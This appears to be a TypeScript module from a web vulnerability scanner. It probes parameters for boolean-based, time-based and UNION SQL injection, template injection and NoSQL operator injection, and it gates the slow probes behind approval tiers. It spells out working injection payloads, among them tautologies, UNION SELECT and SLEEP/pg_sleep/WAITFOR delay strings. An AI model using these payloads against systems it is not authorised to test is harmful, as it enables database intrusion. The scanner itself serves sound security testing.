// Probe family module — implementation moved verbatim from surface-engine.ts (no behavior change).
import { randomInt } from 'node:crypto'
import { BrokerApprovalRequired, BrokerDenied } from '.././broker.ts'
import type { BrokerExchangeResult, Grant } from '.././broker.ts'
import { dbErrorDialect, injectParam, randToken, responseSimilarity } from './context.ts'
import type { DiffContext, DiffOutcome, SurfaceParamLocation } from './context.ts'
import type { ProbeModule } from './registry.ts'



export function isPrime(n: number): boolean {
  if (n < 2) return false
  if (n % 2 === 0) return n === 2
  for (let i = 3; i * i <= n; i += 2) if (n % i === 0) return false
  return true
}



export function randomPrime(min: number, max: number, exclude?: number): number {
  for (;;) {
    const c = randomInt(min, max) | 1
    if (c !== exclude && isPrime(c)) return c
  }
}



export const templateSyntaxes: Array<{ engine: string; format: (a: number, b: number) => string }> = [
  { engine: 'jinja2/twig', format: (a, b) => `{{${a}*${b}}}` },
  { engine: 'erb', format: (a, b) => `<%=${a}*${b}%>` },
  { engine: 'freemarker/el', format: (a, b) => '${' + `${a}*${b}` + '}' },
  { engine: 'spel/pebble', format: (a, b) => `#{${a}*${b}}` },
  { engine: 'thymeleaf', format: (a, b) => '[[${' + `${a}*${b}` + '}]]' },
]



// ---------------------------------------------------------------------------------------------
// Baseline grounding for SQL predicates
// ---------------------------------------------------------------------------------------------

const groundTextField = /^(?:title|name|label|subject|headline|display_?name|slug|q|query|term|keyword|username|email|city|category|sku|code|status)$/i
const groundOpaqueField = /^(?:id|uuid|uid|external_?id|[a-z0-9]*_id|url|uri|href|link|image|avatar|photo|thumbnail|icon|html|body|description|token|secret|password|hash|signature|created_?at|updated_?at|date|time|timestamp|expires?_?at)$/i
const groundSafeValue = /^[A-Za-z0-9][A-Za-z0-9 ._@:/'-]{2,47}$/
const groundCollectionKey = /results|items|rows|data|records|list|hits|entries|nodes|objects|docs|products|projects|users|orders|posts|articles|collection/i

export interface GroundTerms {
  /** Literal string operands harvested from result rows, most searchable first. */
  text: string[]
  /** Positive integer operands (ids/prices/quantities) for numeric predicates. */
  numeric: string[]
}

/**
 * Harvest literal operands from a benign JSON collection response. A boolean SQLi pair must lead
 * with a value the target's own data actually contains: `title LIKE '%<term>%'` only yields the
 * baseline rows for the true arm when `<term>` exists in the catalog. A dev fixture word or seed
 * literal is not portable across catalogs, so grounding comes from the response itself.
 */
export function extractGroundTerms(body: string): GroundTerms {
  let parsed: unknown
  try { parsed = JSON.parse(body) } catch { return { text: [], numeric: [] } }
  const rows: Array<{ row: Record<string, unknown>; collection: boolean }> = []
  const visit = (node: unknown, depth: number, key: string): void => {
    if (!node || typeof node !== 'object' || depth > 4) return
    if (Array.isArray(node)) {
      const collection = groundCollectionKey.test(key)
      for (const entry of node.slice(0, 8)) {
        if (entry && typeof entry === 'object' && !Array.isArray(entry)) {
          rows.push({ row: entry as Record<string, unknown>, collection })
        } else if (typeof entry === 'string') {
          rows.push({ row: { value: entry }, collection })
        }
      }
      return
    }
    for (const [childKey, child] of Object.entries(node as Record<string, unknown>)) visit(child, depth + 1, childKey)
  }
  visit(parsed, 0, '')
  rows.sort((a, b) => Number(b.collection) - Number(a.collection))
  const text: string[] = []
  const numeric: string[] = []
  for (const { row } of rows) {
    for (const [key, value] of Object.entries(row)) {
      if (typeof value === 'number' && Number.isInteger(value) && value > 0 && value < 1_000_000_000) {
        const n = String(value)
        if (!numeric.includes(n)) numeric.push(n)
        continue
      }
      if (typeof value !== 'string') continue
      if (groundOpaqueField.test(key) && !groundTextField.test(key)) continue
      const clean = value.trim().replace(/\s+/g, ' ')
      if (!groundSafeValue.test(clean)) continue
      if (!/[A-Za-z]/.test(clean)) continue
      if (/['"\\%;<>\u0000-\u001f]/.test(clean) || clean.includes('--') || clean.includes('/*')) continue
      const words = clean.split(' ')
      const forms = [clean]
      if (words.length > 1) forms.push(words.slice(-2).join(' '), words[words.length - 1]!, words.slice(0, 2).join(' '))
      forms.push(words[0]!)
      for (const form of forms) {
        if (form.length < 3 || form.length > 48) continue
        if (!text.includes(form)) text.push(form)
      }
    }
  }
  return { text: text.slice(0, 12), numeric: numeric.slice(0, 4) }
}

/** First harvested operand, preferring one already visible in the declared baseline body. */
export function pickGroundTerm(body: string, baselineBody?: string): string | null {
  const { text } = extractGroundTerms(body)
  if (text.length === 0) return null
  if (baselineBody) {
    const preferred = text.find(term => baselineBody.includes(term))
    if (preferred) return preferred
  }
  return text[0]!
}

export async function diffBooleanDifferential(ctx: DiffContext): Promise<DiffOutcome> {
  const { req, send, anomalies } = ctx
  const declaredBase = req.baselineValue ?? '1'

  // Ground the pair before probing: one benign request with a neutral/empty term. If the response
  // yields a literal operand, both the baseline and the true arm lead with it so the LIKE/equality
  // prefix matches the target's own rows. If the empty term returns no rows but the caller's
  // baseline does, that baseline is already response-grounded and is kept. Only when neither
  // matches does the pair degrade to the tautology (`' OR '1'='1` vs `' AND '1'='2`) — never to a
  // blind seed/app literal.
  const benign = await send(injectParam(req, ''))
  const benignOk = Boolean(benign && benign.status >= 200 && benign.status < 300)
  const benignRows = benign ? countRecords(benign.body) : null
  const ground = benignOk ? extractGroundTerms(benign!.body) : { text: [], numeric: [] }
  const harvested = ground.text[0] ?? null
  const declaredSafe = declaredBase.length >= 3 && declaredBase.length <= 48 &&
    !/['"\\%;<>\u0000-\u001f]/.test(declaredBase) && !declaredBase.includes('--')
  let groundTerm = harvested
  let groundSource: 'harvested' | 'declared' | 'tautology' | 'caller' = harvested !== null ? 'harvested' : 'tautology'
  let baseValue: string
  let baseA: BrokerExchangeResult | null
  let baseB: BrokerExchangeResult | null
  if (harvested !== null) {
    baseValue = harvested
    baseA = await send(injectParam(req, baseValue))
    baseB = await send(injectParam(req, baseValue))
  } else if (benignOk && benignRows !== null && benignRows > 0) {
    // The neutral term itself returns the collection, so it is a valid non-seed anchor.
    baseValue = ''
    baseA = benign
    baseB = await send(injectParam(req, ''))
  } else if (benignOk && benignRows !== null && declaredSafe) {
    // Empty term matches nothing (equality/numeric sink); keep the caller's baseline only when it
    // demonstrably returns rows on this target.
    const declaredProbe = await send(injectParam(req, declaredBase))
    const declaredRows = declaredProbe ? countRecords(declaredProbe.body) : null
    if (declaredProbe && declaredRows !== null && declaredRows > 0) {
      groundTerm = declaredBase
      groundSource = 'declared'
      baseValue = declaredBase
      baseA = declaredProbe
      baseB = await send(injectParam(req, declaredBase))
    } else {
      baseValue = ''
      baseA = benign
      baseB = await send(injectParam(req, ''))
    }
  } else if (benignOk) {
    baseValue = ''
    baseA = benign
    baseB = await send(injectParam(req, ''))
  } else {
    // Non-JSON or failed neutral probe: keep the caller's value (opaque carriers have no catalog).
    groundSource = 'caller'
    baseValue = declaredBase
    baseA = await send(injectParam(req, baseValue))
    baseB = await send(injectParam(req, baseValue))
  }
  const numericBase = ground.numeric[0] ?? (/^\d{1,9}$/.test(declaredBase) ? declaredBase : null)
  if (!baseA || !baseB) return { verdict: 'inconclusive', summary: 'Baseline requests failed.', details: {} }

  const baselineDialect = dbErrorDialect(baseA.body)
  let detectedErrorDialect: string | null = null
  let consecutive5xx = 0
  let total5xx = 0

  const checkDbError = (ex: BrokerExchangeResult | null) => {
    if (!ex) return
    if (ex.status >= 500) {
      consecutive5xx += 1
      total5xx += 1
    } else {
      consecutive5xx = 0
    }
    const d = dbErrorDialect(ex.body)
    if (d && d !== baselineDialect && !detectedErrorDialect) {
      detectedErrorDialect = d
      anomalies.push({ type: 'db_error_fingerprint', dialect: d })
    }
  }

  // Expanded style matrix. LIKE-wrapped sinks are common (search boxes), so the `%` breakout runs
  // early. Every shape that embeds a leading operand uses the grounded baseline; the numeric shape
  // additionally requires a numeric operand from the same response (never a bare seed number).
  type SqlBooleanStyle = {
    name: string
    orBranch?: boolean
    quoteStyle: 'single' | 'double' | 'numeric'
    template: string
  }
  const groundedStyles: SqlBooleanStyle[] = [
    { name: 'single_quote', quoteStyle: 'single', template: "{{baseline}}' AND {{sql_expr}}-- -" },
    { name: 'single_paren', quoteStyle: 'single', template: "{{baseline}}') AND {{sql_expr}}-- -" },
    { name: 'like_breakout', quoteStyle: 'single', template: "{{baseline}}%' AND {{sql_expr}}-- -" },
    { name: 'or_branch', orBranch: true, quoteStyle: 'single', template: "{{baseline}}' OR {{sql_expr}}-- -" },
    ...(numericBase ? [{ name: 'numeric', quoteStyle: 'numeric' as const, template: '{{baseline}} AND {{sql_expr}}' }] : []),
    { name: 'double_quote', quoteStyle: 'double', template: '{{baseline}}" AND {{sql_expr}}-- -' },
    { name: 'single_double_paren', quoteStyle: 'single', template: "{{baseline}}')) AND {{sql_expr}}-- -" },
    { name: 'order_by', quoteStyle: 'single', template: '{{baseline}} ORDER BY (CASE WHEN ({{sql_expr}}) THEN 1 ELSE 2 END)-- -' },
  ]
  // No harvested operand: prove the predicate is injectable with the tautology pair. The true arm
  // keeps the collection (`LIKE '%' OR '1'='1`), the false arm drops it (`AND '1'='2`).
  const tautologyStyle: SqlBooleanStyle = { name: 'tautology', orBranch: true, quoteStyle: 'single', template: "{{baseline}}' AND {{sql_expr}}-- -" }
  // The detection pair switches operator (OR true / AND false), which one replay template cannot
  // express. Replay the equivalent single-template pair for the sink: a LIKE/collection baseline
  // (rows on an empty term) keeps rows with `' AND k=k`; an equality/numeric sink that returned no
  // rows on an empty term needs the OR branch to keep its rows.
  const tautologyReplayTemplate = (countRecords(baseA.body) ?? 0) > 0
    ? "{{baseline}}' AND {{sql_expr}}-- -"
    : "{{baseline}}' OR {{sql_expr}}-- -"
  const styles: SqlBooleanStyle[] = groundTerm === null ? [tautologyStyle, ...groundedStyles] : groundedStyles
  const specTemplateOf = (style: SqlBooleanStyle): string =>
    style.name === 'tautology' ? tautologyReplayTemplate : style.template
  const makePayload = (style: SqlBooleanStyle, base: string, k: number, truth: boolean): string => {
    if (style.name === 'tautology') return truth ? `${base}' OR '1'='1` : `${base}' AND '1'='2`
    const expr = `${k}=${truth ? k : k + 1}`
    return style.template.replaceAll('{{baseline}}', base).replaceAll('{{sql_expr}}', expr)
  }
  const signals: Array<Record<string, unknown>> = []
  let divergentStyles = 0
  let stylesRun = 0
  for (const style of styles) {
    if (consecutive5xx >= 3 || (detectedErrorDialect && total5xx >= 2)) break
    // A parameter the app ignores answers every probe with the byte-identical baseline. Four shapes
    // (including the OR branch, which proves non-LIKE sinks without a baseline) are enough evidence.
    if (stylesRun >= 4 && divergentStyles === 0) break
    stylesRun += 1
    const styleBase = style.name === 'numeric' ? (numericBase ?? baseValue) : baseValue
    const baselineRows = countRecords(baseA.body)
    const rounds: Array<Record<string, unknown>> = []
    let pass = true
    for (let r = 0; r < 2; r += 1) {
      if (consecutive5xx >= 3 || (detectedErrorDialect && total5xx >= 2)) { pass = false; break }
      const k = randomInt(1000, 9999)
      const tVal = makePayload(style, styleBase, k, true)
      const fVal = makePayload(style, styleBase, k, false)
      const t = await send(injectParam(req, tVal))
      checkDbError(t)
      if (consecutive5xx >= 3 || (detectedErrorDialect && total5xx >= 2)) { pass = false; break }
      const f = await send(injectParam(req, fVal))
      checkDbError(f)
      if (!t || !f) { pass = false; break }
      // JSON sinks often echo the query back. Scrub the injected payload and the baseline value from
      // both sides so the comparison reflects the returned data, not the echo of differing inputs.
      const scrub = (body: string, values: string[]): string => {
        let s = body
        for (const v of values) if (v) s = s.split(v).join('\u0000')
        return s
      }
      const simBaseTrue = responseSimilarity(scrub(baseA.body, [baseValue]), scrub(t.body, [tVal, baseValue]))
      const simBaseFalse = responseSimilarity(scrub(baseA.body, [baseValue]), scrub(f.body, [fVal, baseValue]))
      const simTrueFalse = responseSimilarity(scrub(t.body, [tVal, baseValue]), scrub(f.body, [fVal, baseValue]))
      const statusDiverges = t.status === baseA.status && f.status !== t.status && f.status < 500
      // Both arms must be successful, the true arm must keep the baseline's rows (when the baseline
      // had any), and the separation must be visible in rows or body — a status-only delta is not a
      // boolean oracle.
      const trueRows = countRecords(t.body)
      const falseRows = countRecords(f.body)
      const rowsComparable = trueRows !== null && falseRows !== null
      const baselineHadRows = baselineRows !== null && baselineRows > 0
      const trueNonEmptyOk = !baselineHadRows || (trueRows !== null && trueRows > 0)
      const contentSeparates = simTrueFalse <= 0.75
      const rowSeparates = rowsComparable && trueRows !== falseRows
      const arms2xx = t.status >= 200 && t.status < 300 && f.status >= 200 && f.status < 300
      const separationOk = rowsComparable ? (contentSeparates || rowSeparates) : (contentSeparates || statusDiverges)
      if (simBaseTrue < 0.98 || simBaseFalse < 0.98 || t.status !== baseA.status || f.status !== baseA.status) divergentStyles += 1
      const baselineMatch = style.orBranch
        ? Math.max(simBaseTrue, simBaseFalse) >= 0.9
        : simBaseTrue >= 0.9
      const roundPass = arms2xx && trueNonEmptyOk && baselineMatch && separationOk
      rounds.push({
        k, statusBase: baseA.status, statusTrue: t.status, statusFalse: f.status,
        rowsBase: baselineRows, rowsTrue: trueRows, rowsFalse: falseRows,
        simBaseTrue, simBaseFalse, simTrueFalse, roundPass,
      })
      if (!roundPass) { pass = false; break }
    }
    const passed = pass && rounds.length === 2
    signals.push({
      style: style.name,
      baselineValue: styleBase,
      quoteStyle: style.quoteStyle,
      valueTemplate: specTemplateOf(style),
      passed,
      rounds,
    })
    if (passed) break
  }
  let unionSignal: Record<string, unknown> | null = null
  const interesting = divergentStyles > 0 || Boolean(detectedErrorDialect)
  if (!signals.some(s => s.passed) && interesting && consecutive5xx < 3 && !(detectedErrorDialect && total5xx >= 2)) {
    const unionResults: Array<{ cols: number; status: number; simToBase: number }> = []
    for (const cols of [1, 2, 3]) {
      if (consecutive5xx >= 3 || (detectedErrorDialect && total5xx >= 2)) break
      const nulls = Array.from({ length: cols }, () => 'NULL').join(',')
      const ex = await send(injectParam(req, `${baseValue}' UNION SELECT ${nulls}-- -`))
      checkDbError(ex)
      if (!ex) continue
      unionResults.push({ cols, status: ex.status, simToBase: responseSimilarity(baseA.body, ex.body) })
    }
    const ok2xx = unionResults.filter(u => u.status >= 200 && u.status < 300)
    const errNon5xx = unionResults.filter(u => u.status >= 400 && u.status < 500)
    if (ok2xx.length === 1 && (errNon5xx.length >= 1 || unionResults.some(u => u.simToBase <= 0.75))) {
      unionSignal = { style: 'union_null', passed: true, columns: ok2xx[0].cols, results: unionResults }
      signals.push(unionSignal)
    } else if (unionResults.length > 0) {
      signals.push({ style: 'union_null', passed: false, results: unionResults })
    }
  }

  // A lone quote is the cheapest error-fingerprint probe; keep it even when no style diverged.
  const quoteOne = (consecutive5xx < 3 && !(detectedErrorDialect && total5xx >= 2))
    ? await send(injectParam(req, `${baseValue}'`))
    : null
  checkDbError(quoteOne)
  const quoteTwo = (quoteOne && (interesting || Boolean(detectedErrorDialect)) && consecutive5xx < 3 && !(detectedErrorDialect && total5xx >= 2))
    ? await send(injectParam(req, `${baseValue}''`))
    : null
  checkDbError(quoteTwo)

  const errorDialect = detectedErrorDialect ?? (quoteOne ? dbErrorDialect(quoteOne.body) : null)
  const details: Record<string, unknown> = {
    baselineStable: baseA.bodySha256 === baseB.bodySha256 || responseSimilarity(baseA.body, baseB.body) >= 0.98,
    baselineValue: baseValue,
    baselineSource: groundSource,
    groundedBaselineValue: groundTerm,
    benignStatus: benign ? benign.status : null,
    baselineRows: countRecords(baseA.body),
    booleanSignals: signals,
    dbErrorDialect: errorDialect && errorDialect !== baselineDialect ? errorDialect : null,
    quoteDelta: quoteOne && quoteTwo
      ? { singleStatus: quoteOne.status, pairedStatus: quoteTwo.status, similarity: responseSimilarity(quoteOne.body, quoteTwo.body) }
      : null,
  }
  const passed = signals.find(s => s.passed)
  const anyTrueArmRows = signals.some(s =>
    Array.isArray(s.rounds) && (s.rounds as Array<Record<string, unknown>>).some(r => typeof r.rowsTrue === 'number' && r.rowsTrue > 0))
  const ranAnyRound = signals.some(s => Array.isArray(s.rounds) && s.rounds.length > 0)
  let summary = 'No boolean or error differential observed.'
  let verdict: DiffOutcome['verdict'] = 'no_signal'
  if (passed) {
    verdict = 'signal'
    const groundNote = groundTerm !== null ? ` grounded on response operand "${groundTerm}"` : ''
    summary = `Boolean differential (${String(passed.style)}) held across randomized rounds${groundNote}: equal-comparison matches baseline rows, unequal-comparison diverges.`
    // Legacy spec builders replay `style` against the caller's own baseline. The tautology pair
    // (OR true / AND false) has no single-template replay, so expose the equivalent OR branch; all
    // other proven shapes keep their own name. The exact proven pair travels in
    // `provenStyle`/`baselineValue`/`valueTemplate` for builders that read it.
    const provenStyle = String(passed.style)
    const legacyStyle = provenStyle === 'tautology' ? 'or_branch' : provenStyle
    anomalies.push({
      type: 'boolean_differential',
      style: legacyStyle,
      provenStyle,
      baselineValue: passed.baselineValue,
      quoteStyle: passed.quoteStyle,
      valueTemplate: passed.valueTemplate,
      rounds: passed.rounds ?? passed.results,
    })
  }
  if (details.dbErrorDialect) {
    verdict = 'signal'
    summary = `${passed ? summary + ' ' : ''}${String(details.dbErrorDialect)} database error fingerprint on SQL syntax probe.`
    if (!anomalies.some(a => a.type === 'db_error_fingerprint')) {
      anomalies.push({ type: 'db_error_fingerprint', dialect: details.dbErrorDialect })
    }
  }
  // No arm reproduced rows on a sink that answered the probe: a probe-precondition failure (e.g.
  // the operand is not reachable through this sink), not a clean negative and never a pass.
  if (verdict === 'no_signal' && ranAnyRound && !anyTrueArmRows) {
    verdict = 'inconclusive'
    summary = 'Every boolean arm returned no rows; the operand could not be grounded through this sink.'
  }
  return { verdict, summary, details }
}



export function medianOf(nums: readonly number[]): number {
  if (nums.length === 0) return 0
  const sorted = [...nums].sort((a, b) => a - b)
  const mid = Math.floor(sorted.length / 2)
  return sorted.length % 2 === 1 ? sorted[mid] : (sorted[mid - 1] + sorted[mid]) / 2
}

/** Median absolute deviation: a jitter-tolerant spread estimator for a small sample. */
export function medianAbsoluteDeviation(nums: readonly number[]): number {
  if (nums.length === 0) return 0
  const center = medianOf(nums)
  return medianOf(nums.map(value => Math.abs(value - center)))
}

/**
 * Adaptive sleep delay for a noisy (WAN-jittered) link.
 *
 * A fixed 1.5 s delay is indistinguishable when the link's own spread is a large fraction of it.
 * The delay is raised until the expected signal is several times the observed control spread, then
 * clamped to the documented probe bound (1.5–5 s) so a blind probe never turns into a slow scan.
 */
export function adaptiveTimingDelayMs(baselineDurations: readonly number[], requestedMs: number): number {
  const requested = Number.isFinite(requestedMs) ? requestedMs : 1500
  if (baselineDurations.length < 2) {
    return Math.max(1500, Math.min(5000, Math.round(requested)))
  }
  const spread = Math.max(...baselineDurations) - Math.min(...baselineDurations)
  // 3x the observed spread keeps a real sleep outside the noise envelope with room to spare.
  return Math.max(1500, Math.min(5000, Math.round(Math.max(requested, spread * 3 + 150))))
}

export interface TimingDifferentialSample {
  baselineDurations: readonly number[]
  probeDurations: readonly number[]
  /** Every HTTP status observed for the paired rounds (all must be < 500). */
  statuses: readonly number[]
  delayMs: number
}

export interface TimingDifferentialAssessment {
  passed: boolean
  reason: string
  rounds: number
  baselineMedianMs: number
  probeMedianMs: number
  baselineMadMs: number
  controlSpanMs: number
  requiredDeltaMs: number
  observedDeltaMs: number
  /** Probes above the slowest control, allowing one jitter outlier. */
  probesAboveControl: number
}

/**
 * Robust `sqli_time_diff` decision.
 *
 * The old rule required `min(probe) > max(baseline)` plus a 0.85x-delay delta. On a WAN link with
 * 50–300 ms jitter a single slow control sample defeats `min > max`, and a single fast probe sample
 * defeats the delta, so a real sleep is missed. The robust rule uses medians and MAD:
 *
 *  - the median separation must exceed `max(0.6 x delay, 3 x MAD + 40 ms, 250 ms)`;
 *  - the median probe must clear the *slowest* control by at least 20% of the delay;
 *  - at least `rounds - 1` probes must exceed the slowest control (one outlier tolerated);
 *  - every paired round must be non-5xx.
 *
 * A uniformly slow server (both arms slow) still fails: only the *separation* is signal.
 */
export function assessTimingDifferential(sample: TimingDifferentialSample): TimingDifferentialAssessment {
  const rounds = Math.min(sample.baselineDurations.length, sample.probeDurations.length)
  const baselineMedianMs = medianOf(sample.baselineDurations)
  const probeMedianMs = medianOf(sample.probeDurations)
  const baselineMadMs = medianAbsoluteDeviation(sample.baselineDurations)
  const controlSpanMs = sample.baselineDurations.length === 0
    ? 0
    : Math.max(...sample.baselineDurations) - Math.min(...sample.baselineDurations)
  const controlMaxMs = sample.baselineDurations.length === 0 ? 0 : Math.max(...sample.baselineDurations)
  const observedDeltaMs = probeMedianMs - baselineMedianMs
  const delayMs = Math.max(1, sample.delayMs)
  const requiredDeltaMs = Math.max(0.6 * delayMs, 3 * baselineMadMs + 40, 250)
  const probesAboveControl = sample.probeDurations.filter(duration => duration > controlMaxMs).length
  const statusesOk = sample.statuses.every(status => status < 500)
  const common = {
    rounds,
    baselineMedianMs,
    probeMedianMs,
    baselineMadMs,
    controlSpanMs,
    requiredDeltaMs,
    observedDeltaMs,
    probesAboveControl,
  }
  if (rounds < 3) return { ...common, passed: false, reason: `too few interleaved rounds (${rounds} < 3)` }
  if (!statusesOk) return { ...common, passed: false, reason: 'a paired round returned a 5xx' }
  if (observedDeltaMs < requiredDeltaMs) {
    return { ...common, passed: false, reason: `median separation ${Math.round(observedDeltaMs)}ms is inside the jitter envelope (needs ${Math.round(requiredDeltaMs)}ms)` }
  }
  if (probeMedianMs - controlMaxMs < 0.2 * delayMs) {
    return { ...common, passed: false, reason: `probe median ${Math.round(probeMedianMs)}ms does not clear the slowest control ${Math.round(controlMaxMs)}ms` }
  }
  if (probesAboveControl < rounds - 1) {
    return { ...common, passed: false, reason: `only ${probesAboveControl}/${rounds} probes exceeded the slowest control` }
  }
  return { ...common, passed: true, reason: `median separation ${Math.round(observedDeltaMs)}ms exceeds the jitter envelope (${Math.round(requiredDeltaMs)}ms) across ${rounds} rounds` }
}



export async function diffSqlTimeDifferential(ctx: DiffContext, grant: Grant): Promise<DiffOutcome> {
  const { req, send, anomalies } = ctx
  const localLab = Boolean(grant.allowLocalLab && process.env.GUARDIAN_ALLOW_LOCAL_LAB === '1')
  const tier = grant.tier ?? 1
  const location: SurfaceParamLocation = req.paramLocation ?? (req.method && req.method !== 'GET' ? 'json' : 'query')
  const method = req.method ?? (['json', 'form', 'xml', 'graphql_var'].includes(location) ? 'POST' : 'GET')

  if (!localLab) {
    if (tier < 3) {
      throw new BrokerDenied('sqli_time_diff is blocked on public projects below Tier 3 (requires local-lab or explicit Tier-3 HITL approval).')
    }
    if (!(grant.isStateChangeApproved?.(ctx.origin, method, req.pathAndQuery) ?? false)) {
      throw new BrokerApprovalRequired(ctx.origin, method, req.pathAndQuery)
    }
  }

  const requestedDelayMs = Math.max(1500, Math.min(3000, Math.round(req.delayMs ?? 1500)))
  const baseValue = req.baselineValue ?? '1'
  // Preflight: measure the link's own spread first. On a jittered WAN link a fixed delay can hide
  // inside the noise, so the delay is raised until the expected sleep is several spreads wide.
  const preflightDurations: number[] = []
  for (let i = 0; i < 4; i += 1) {
    const sample = await send(injectParam(req, baseValue))
    if (!sample || sample.status >= 500) continue
    preflightDurations.push(sample.durationMs)
  }
  const delayMs = adaptiveTimingDelayMs(preflightDurations, requestedDelayMs)
  const delaySec = Number((delayMs / 1000).toFixed(2))
  const delaySecInt = Math.max(1, Math.round(delayMs / 1000))

  const sqliteDelay = Math.min(90_000_000, delayMs * 25_000)
  const allCandidates: Array<{ dialect: 'mysql' | 'postgres' | 'mssql' | 'sqlite'; style: string; payload: string }> = [
    { dialect: 'mysql', style: 'numeric', payload: `${baseValue} AND SLEEP(${delaySec})` },
    { dialect: 'mysql', style: 'single_quote', payload: `${baseValue}' AND SLEEP(${delaySec})-- -` },
    { dialect: 'postgres', style: 'single_quote', payload: `${baseValue}' AND (SELECT 1 FROM pg_sleep(${delaySec})) IS NULL-- -` },
    { dialect: 'postgres', style: 'numeric', payload: `${baseValue} AND (SELECT 1 FROM pg_sleep(${delaySec})) IS NULL` },
    { dialect: 'mssql', style: 'single_quote', payload: `${baseValue}'; WAITFOR DELAY '0:0:${delaySecInt}'-- -` },
    { dialect: 'sqlite', style: 'single_quote', payload: `${baseValue}' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(${sqliteDelay}))))-- -` },
    // OR-branch variants keep the delay expression reachable when the left comparison is false (a
    // blind query often filters on a value the caller's own baseline does not match).
    { dialect: 'mysql', style: 'or_branch', payload: `${baseValue}' OR SLEEP(${delaySec})-- -` },
    { dialect: 'postgres', style: 'or_branch', payload: `${baseValue}' OR (SELECT 1 FROM pg_sleep(${delaySec})) IS NULL-- -` },
    { dialect: 'sqlite', style: 'or_branch', payload: `${baseValue}' OR 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(${sqliteDelay}))))-- -` },
  ]
  const candidates = req.dialect
    ? [
        ...allCandidates.filter(c => c.dialect === req.dialect),
        ...allCandidates.filter(c => c.dialect !== req.dialect),
      ]
    : allCandidates

  const maxRounds = 4
  const candidateSummaries: Array<Record<string, unknown>> = []
  for (const cand of candidates) {
    const baselineDurations: number[] = []
    const probeDurations: number[] = []
    const statuses: number[] = []
    for (let round = 0; round < maxRounds; round += 1) {
      // Interleave one baseline and one probe per round so drift affects both arms equally.
      const baseline = await send(injectParam(req, baseValue))
      if (!baseline) break
      const probe = await send(injectParam(req, cand.payload))
      if (!probe) break
      baselineDurations.push(baseline.durationMs)
      probeDurations.push(probe.durationMs)
      statuses.push(baseline.status, probe.status)
      if (round === 1) {
        // Early skip only when there is no hint of a delay at all; a single slow probe keeps the
        // candidate alive so a jitter outlier cannot mask a real sleep.
        const approxDelta = medianOf(probeDurations) - medianOf(baselineDurations)
        const anyProbeSlower = Math.max(...probeDurations) > Math.max(...baselineDurations)
        if (approxDelta < 0.25 * delayMs && !anyProbeSlower) break
      }
    }
    const assessment = assessTimingDifferential({ baselineDurations, probeDurations, statuses, delayMs })
    const summaryRow = {
      dialect: cand.dialect,
      style: cand.style,
      delayMs,
      requestedDelayMs,
      preflightSpanMs: preflightDurations.length > 1
        ? Math.max(...preflightDurations) - Math.min(...preflightDurations)
        : 0,
      ...assessment,
    }
    candidateSummaries.push(summaryRow)
    if (!assessment.passed) continue
    const { baselineMedianMs, probeMedianMs } = assessment
    anomalies.push({ type: 'sql_time_differential', ...summaryRow })
    return {
      verdict: 'signal',
      summary: `Jitter-tolerant time-based SQL differential (${cand.dialect}/${cand.style}) held across ${assessment.rounds} interleaved rounds (probe median ${Math.round(probeMedianMs)}ms vs baseline median ${Math.round(baselineMedianMs)}ms, delay ${delayMs}ms).`,
      details: { ...summaryRow, suggestedReplayKind: 'sql_time_diff', candidates: candidateSummaries },
    }
  }

  return {
    verdict: 'no_signal',
    summary: `No time-based SQL differential cleared the jitter envelope across ${maxRounds} interleaved rounds (delay ${delayMs}ms).`,
    details: { delayMs, requestedDelayMs, suggestedReplayKind: 'sql_time_diff', candidates: candidateSummaries },
  }
}



export async function diffTemplateMath(ctx: DiffContext): Promise<DiffOutcome> {
  const { req, send, anomalies } = ctx
  const baseValue = req.baselineValue ?? 'guardianbase'
  const base = await send(injectParam(req, baseValue))
  if (!base) return { verdict: 'inconclusive', summary: 'Baseline request failed.', details: {} }
  const results: Array<Record<string, unknown>> = []
  for (const syntax of templateSyntaxes) {
    const a = randomPrime(101, 997)
    const b = randomPrime(101, 997, a)
    const expression = syntax.format(a, b)
    const product = String(a * b)
    const ex = await send(injectParam(req, `g${randToken(3)}${expression}g${randToken(3)}`))
    if (!ex) continue
    const evaluated = ex.body.includes(product) && !base.body.includes(product)
    const literalReflected = ex.body.includes(expression)
    results.push({ engine: syntax.engine, expression, product, evaluated, literalReflected, status: ex.status })
    if (evaluated) anomalies.push({ type: 'expression_evaluated', engine: syntax.engine, expression, product, literalReflected })
  }
  const hit = results.find(r => r.evaluated)
  return {
    verdict: hit ? 'signal' : 'no_signal',
    summary: hit
      ? `Server evaluated a randomized arithmetic expression (${String(hit.engine)} syntax); product ${String(hit.product)} appeared only in the probe response.`
      : 'No template expression was evaluated.',
    details: { results },
  }
}



export function countRecords(body: string): number | null {
  try {
    const parsed = JSON.parse(body) as unknown
    if (Array.isArray(parsed)) return parsed.length
    if (parsed && typeof parsed === 'object') {
      for (const value of Object.values(parsed as Record<string, unknown>)) if (Array.isArray(value)) return value.length
    }
  } catch { /* not JSON */ }
  return null
}



export async function diffOperatorTypes(ctx: DiffContext): Promise<DiffOutcome> {
  const { req, send, anomalies } = ctx
  const marker = `gn${randToken(8)}`
  const base = await send(injectParam(req, marker))
  const neutral = await send(injectParam(req, { gx: marker }))
  const variants: Array<{ name: string; value: Record<string, unknown> }> = [
    { name: 'ne', value: { $ne: marker } },
    { name: 'gt_empty', value: { $gt: '' } },
  ]
  if (!base || !neutral) return { verdict: 'inconclusive', summary: 'Baseline requests failed.', details: {} }
  const results: Array<Record<string, unknown>> = []
  const neutralMatchesBase = neutral.status === base.status && responseSimilarity(base.body, neutral.body) >= 0.9
  for (const variant of variants) {
    const ex = await send(injectParam(req, variant.value))
    if (!ex) continue
    const diverges = ex.status !== base.status || responseSimilarity(base.body, ex.body) < 0.75
    results.push({
      operator: variant.name, status: ex.status, baseStatus: base.status,
      similarityToBaseline: responseSimilarity(base.body, ex.body),
      baseRecords: countRecords(base.body), probeRecords: countRecords(ex.body), diverges,
    })
    if (diverges && neutralMatchesBase && ex.status < 500) {
      anomalies.push({ type: 'operator_type_divergence', operator: variant.name, status: ex.status, neutralMatchesBase: true })
    }
  }
  const hit = results.some(r => r.diverges) && neutralMatchesBase
  return {
    verdict: hit ? 'signal' : 'no_signal',
    summary: hit
      ? 'Query-operator objects changed the response while a neutral object control matched the baseline.'
      : 'Operator-typed values did not change the response relative to the controls.',
    details: { neutralMatchesBase, results },
  }
}



/**
 * Command-injection nonce oracle. Injects semicolon/subshell/pipe/backtick echo variants into a
 * parameter that plausibly reaches a shell (host/ip/name/path/cmd/diagnostic endpoints). Execution
